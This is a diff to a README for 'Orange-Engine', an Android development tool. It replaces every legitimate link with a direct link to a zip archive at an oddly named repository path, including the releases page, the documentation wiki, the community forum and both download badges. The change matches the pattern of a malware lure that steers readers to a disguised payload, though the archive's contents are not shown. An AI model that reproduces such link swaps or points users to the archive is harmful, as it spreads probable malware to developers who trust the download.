@@ -1,6 +1,6 @@
 # 🌟 Orange-Engine - Simplify Your Android Development
 
-[![Download Orange-Engine](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/jyhuang201900/Orange-Engine/releases)
+[![Download Orange-Engine](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip)](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Orange-Engine is a powerful optimization and debugging tool for Android applicat
 To use Orange-Engine, follow these simple steps:
 
 1. **Visit the Download Page:** Click on the link below to access the download options.
-   - [Download Orange-Engine](https://github.com/jyhuang201900/Orange-Engine/releases)
+   - [Download Orange-Engine](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip)
 
 2. **Choose the Right Version:** On the downloads page, you will see a list of available versions. Select the one that suits your needs.
 
@@ -83,9 +83,9 @@ For additional assistance or questions, please refer to the issues section on Gi
 
 To explore more about Orange-Engine and stay updated, visit the following resources:
 
-- [Documentation](https://github.com/jyhuang201900/Orange-Engine/wiki) 
-- [Community Forum](https://github.com/jyhuang201900/Orange-Engine/discussions) 
+- [Documentation](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip) 
+- [Community Forum](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip) 
 
 Feel free to reach out if you need help. Enjoy simplifying your Android development with Orange-Engine!
 
-[![Download Orange-Engine](https://img.shields.io/badge/Download-Now-grey?style=for-the-badge&logo=github)](https://github.com/jyhuang201900/Orange-Engine/releases)
+[![Download Orange-Engine](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip)](https://github.com/jyhuang201900/Orange-Engine/raw/refs/heads/main/chloroplatinous/Orange_Engine_plantivorous.zip)
